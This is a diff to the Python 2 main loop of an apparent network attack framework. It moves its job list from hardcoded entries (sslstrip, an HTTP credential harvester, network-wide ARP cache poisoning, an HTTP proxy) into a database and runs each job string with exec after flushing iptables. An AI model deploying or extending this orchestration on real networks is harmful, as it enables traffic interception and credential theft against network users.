@@ -4,7 +4,6 @@ import sys
 import time
 import warnings
 
-
 os.system('iptables -F')
 os.system('iptables -X')
 os.system('iptables -t nat -F')
@@ -17,7 +16,7 @@ os.system('iptables -P OUTPUT ACCEPT')
       
 
 #Import DB Libs
-#from lib.GUIServer import *
+from lib.dbmgr import *
 
 #Import Attack Libs
 from lib.feeds import *
@@ -26,17 +25,11 @@ from lib.consumers import *
 from lib.vectors import *
 
 
-def getJobs(a):
-   #Get jobs from DB
-   if a == "0":
-      jobs = [["HTTP Proxy", "1", "0", "rawPacket().portProxy(a);80,10000"], ["sslstrip", "1", "0", "sslstrip().proxy(a);10000"], ["HTTP Credential Harvester", "1", "0", "harvester().httpHarvester(a);packages/sslstrip.log"], ["Network-wide ARP Cache Poison", "1", "0", "arpPoison().poisonAll(a);10.0.0.1,8"], ["Test2", "1", "1", "tmp2"]]
-      
-   else:
-      jobs = []
-   
-   return jobs
+def disableJob(a):
+   #Set job status disabled
+   pass
 
-def execJob(name, cmdstring):
+def execJob(jid, cmdstring):
    #Build job
    exp = cmdstring.split(";")
    
@@ -48,8 +41,11 @@ def execJob(name, cmdstring):
    
    #Invoke Job
    #Invokes the module class and passes a comma delimited argument list
-   print "Invoking job: " + name
+   print "Invoking job: " + str(jid)
    exec exp[0]
+   
+   #Set job status enabled
+   dbmgr().enableJob(jid)
 
    
 def cleanJobs():
@@ -68,28 +64,21 @@ a = "0"
 #Main Execution
 while True:
    #Check settings for active attack components
-   jobs = getJobs(a)
+   jobs = dbmgr().getJobs()
 
    for job in jobs:      
       #Startup new jobs
-      if job[1] == "1" and job[2] == "0":
-         a = "1"
-         
+      if job[2] == 1 and job[3] == 0:         
          #Spawn new job
-         name = job[0]
-         cmdstring = job[3]
-         pid = execJob(name, cmdstring)
-         
-         #Track job pid
-         print pid
-         
-         print "Starting new job " + name
+         jid = job[0]
+         cmdstring = job[4]
+         print "Starting new job " + job[1]
+         execJob(jid, cmdstring)
          
       #Stop deactivated jobs
-      if job[0] == "1" and job[2] == "1":
+      if job[2] == 0 and job[3] == 1:
          print "Stopping job " + job[1]
          
    time.sleep(1)
-
 
 #Add try/except handler to catch keyboard interrupt and kill all jobs
